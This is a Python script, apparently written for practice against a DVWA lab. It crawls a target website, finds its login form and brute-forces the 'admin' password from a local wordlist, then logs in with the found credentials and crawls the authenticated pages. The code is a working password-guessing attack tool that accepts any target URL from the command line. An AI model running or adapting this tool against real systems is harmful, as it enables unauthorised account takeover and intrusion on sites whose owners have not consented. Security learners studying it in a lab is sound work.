from spider import Spider
from bs4 import BeautifulSoup
import argparse, requests
from urllib.parse import urljoin

class fc:
    rw = '\033[31;107m'
    r = '\033[38;5;196m'
    pv = '\033[38;5;206;48;5;57m'
    end = '\033[0m'
    p = '\033[38;5;206m'
    y = '\033[0;33;40m'
    pu = '\033[0;35m'
    wg = '\033[37;42m'
    cy = '\033[36m'
    g = '\033[38;5;154m'
    b = '\033[38;5;45m'

class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u','--url',dest = 'url', help = 'Enter target URL.')
        options = parser.parse_args()
        self.url = options.url

class Vulnscan:
	def __init__(self,url):
		self.spider = Spider(url)
		self.url = url
		
	def runSpider(self): # run spider will test the site and return list of what it can access
		self.spider.run()
		if len(self.spider.storeLinks) > 0:
			# for link in self.spider.storeLinks:
			# 	print(f'{fc.b}{link}{fc.end})
			return self.spider.storeLinks
		else:
			print('List is empty, check link and try again')

	def sessionSpider(self,lst): # session spider will take a list and try to login and gather more links
		for link in lst:
			response = self.spider.reqGet(link)
			if b'action=' in response and b'login.php' in response:
				#print(link)
				bs = BeautifulSoup(response,'html.parser')
				forms = bs.findAll('form') # use forms even if one item , list
				if len(forms) == 1:
					action = forms[0].get('action')
					if 'login' in action:
						form = forms[0]
						action = form.get('action')
						fullurl = (urljoin(link, action))
						inputList = form.findAll('input')
						print(
							f'\n{fc.p}Link: {link}{fc.end}\n'
							f'{fc.p}Action: {action}{fc.end}'
							)
						postData = {}
						for i in inputList:
							
							#print(i.get('name')) # pass in the name of each input into dict of data
							#print(i.get('type'))
							#print(i.get('value'))
							if i.get('value') == None:
								postData[i.get('name')] = ''
							else:
								postData[i.get('name')] = i.get('type')
						
						creds = self.returnCreds(fullurl,postData,'admin')
						if creds:
							print(
								f'{fc.pv}[+]{fc.end} {fc.g}Credentials found'
							)
							return[fullurl,creds]
							
	def login(self,url,data):
		print(
		f'{fc.y}Logging in{fc.end}\n'
		f'{fc.b}URL:{fc.end} {fc.g}{url}{fc.end}\n'
		f'{fc.b}data:{fc.end} {fc.g}{data}{fc.end}\n'
		)
		print(f'Login session: {fc.wg}{self.spider.session}{fc.end}')
		self.spider.session.post(url,data=data)
	
	def returnCreds(self,url,data,user):
		if list(data.keys())[0] == 'username':
			data['username'] = user
		#print(url)
		#print(data)
		with open('/opt/wordlists/passwords.txt','r') as rf:
			for password in rf:
				password = password.strip()
				data['password'] = password
				resp = requests.post(url,data = data,timeout=5) #http://192.168.86.115/dvwa/login.php, passing in data dictionary to post request
				if b'Login failed' not in resp.content and b'Authentication Error' not in resp.content:#<div class="message">Login failed</div>, if password is successful:
					#print(f'URL: {url}\nStatus code: {resp.status_code}\nCredentials: {data}\n')
					return data
				
			print(f'{fc.r}Password not found for {url}{fc.end}')
	
	def listLinks(self,lst):
		for link in lst:
			print(f'{fc.b}{link}{fc.end}')



#########################################################RUN#######################################################

args = Args()
v1 = Vulnscan(args.url)
v1.runSpider()
sesList = v1.sessionSpider(v1.spider.storeLinks)
#print(sesList)
v2 = Vulnscan(v1.url) # cant login with instance 1 and rerun the spider so start a new instance and login first using creds gathered from instance 1 
v2.login(sesList[0],sesList[1])
v2.listLinks(v2.runSpider())












